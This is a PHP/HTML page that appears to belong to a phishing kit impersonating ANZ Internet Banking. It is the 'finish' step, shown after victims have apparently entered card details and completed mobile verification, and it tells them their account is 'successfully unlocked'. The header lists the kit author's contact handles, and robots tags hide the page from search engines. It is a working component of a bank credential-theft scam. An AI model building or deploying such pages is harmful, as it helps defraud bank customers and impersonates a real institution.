<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           ANZ
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ANZ
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

        <link rel="icon" type="image/png" href="../assets/images/fav.png"/>
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <title>Confirm your phone number</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="pt-4">
            <div class="container">
                
                <div class="main-title"><h3>Welcome to ANZ Internet Banking</h3></div>
                <div class="steps">
                    <ul>
                        <li class="active"><span>1</span> ANZ card informations</li>
                        <li class="active"><span>2</span> Mobile verification</li>
                        <li class="active"><span>3</span> Confirmation</li>
                        <li class="active"><span>3</span> Finish</li>
                    </ul>
                </div>
                
                <div class="panel">
                    <div class="panel-body details">
                       <div class="finish">
                            <img class="mt-3 mb-3" src="../assets/images/sus.gif">
                            <p>You have successfully unlocked your account.</p>
                            <p>Thank you for help us.</p>
                       </div>
                    </div>
                </div>

            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <p>&copy; Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
    </body>

</html>